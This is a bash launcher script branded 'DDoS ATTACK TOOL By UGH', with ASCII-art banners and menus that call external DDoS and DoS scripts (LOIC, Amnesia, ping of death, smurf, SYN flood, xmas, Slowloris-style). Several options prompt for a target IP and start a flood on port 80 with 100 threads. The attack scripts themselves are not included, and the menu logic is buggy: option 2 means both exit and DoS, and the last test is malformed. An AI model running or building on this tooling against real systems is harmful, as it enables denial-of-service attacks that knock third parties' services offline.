
clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
clear
toilet -f standard "UGH" -F gay
echo
echo "=========================================="
echo "DDoS ATTACK TOOL  By UGH"
echo "U                U"
echo "U                U"
echo "U                U"
echo "U                U"
echo "U                U"
echo "U                U"
echo "U                U"
echo "       UUUU"

echo "    GGGG"
echo "G                G"
echo "G"
echo "G    GGG"
echo "G                G"
echo "G                G"
 echo "   GGGG"

echo "H            H"
echo "H            H"
echo "H            H"
echo "HHHHHHHHHHHHHH"
echo "H            H"
echo "H            H"
echo "H            H"


echo "==========================================="
echo "                  MENU                     "
echo "============================================="
echo "[1].DDOS ATTACK.   #UGH"
echo "[2].EXIT TOOL.     #UGH"
echo "============================================="
echo  "╭─""Pyae Sone Hmoo"
read -p " ╰─> " pil

#DDOS

if [ $pil = 1 ] || [ $pil = 1 ]
then
clear
toilet -f slant "LIST DDOS" -F metal
echo
echo "============================================="
echo "[1].LOIC"
echo "[2].AMNESIA"
echo "[3].PING OF DEADHT"
echo "[4].POF ARMAGEDON LEVEL"
echo "[5].LORIS"
echo "============================================="
echo  "╭─""UHG"
read -p " ╰─> " ddos
fi

if [ $ddos = 1 ] || [ $ddos = 1 ]
then
clear
python2 LO1C.py
fi

if [ $ddos = 2 ] || [ $ddos = 2 ]
then
clear
perl Amnesia.pl
fi

if [ $ddos = 3 ] || [ $ddos = 3 ]
then
clear
python2 TheSploit.py
fi

if [ $ddos = 4 ] || [ $ddos = 4 ]
then
clear
python2 arma.py
fi

if [ $ddos = 5 ] || [ $ddos = 5 ]
then
clear
python2 lor.py
fi


#DOS



if [ $pil = 2 ] || [ $pil = 2 ]
then
clear
toilet -f slant "LIST DOS" -F metal
echo
echo "============================================="
echo "[1].WIN(TERMUX)"
echo "[2].SUMFR(PC)"
echo "[3].UFOSYN(PC)"
echo "[4].XMAS(PC)"
echo "[5].ANDROMEDA(TERMUX)"
echo "============================================="
echo  "╭─""By UGH"
read -p " ╰─> " dos
fi



if [ $dos = 1 ] || [ $dos = 1 ]
then
clear
toilet -f slant "WIN"
echo $red"MASUKAN IP TARGET"
read -p "===>" win
python2 win.32.64.NT.py -s$win -p80 -t100
fi



if [ $dos = 2 ] || [ $dos = 2 ]
then
clear
python2 smurf.py
fi

if [ $dos = 3 ] || [ $dos = 3 ]
then
clear
python2 ufosyn.py
fi

if [ $dos = 4 ] || [ $dos = 4 ]
then
clear
python2 xmas.py
fi

if [ $dos = 5 ] || [ $dos = 5 ]
then
clear
toilet -f slant "DROID RX" |lolcat
echo $red"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python2 andromeda.py -s$ipt -p80 -t100
fi



#exit

if [ $pil = 2] || [ pil = 2 ]
then
clear
exit
fi
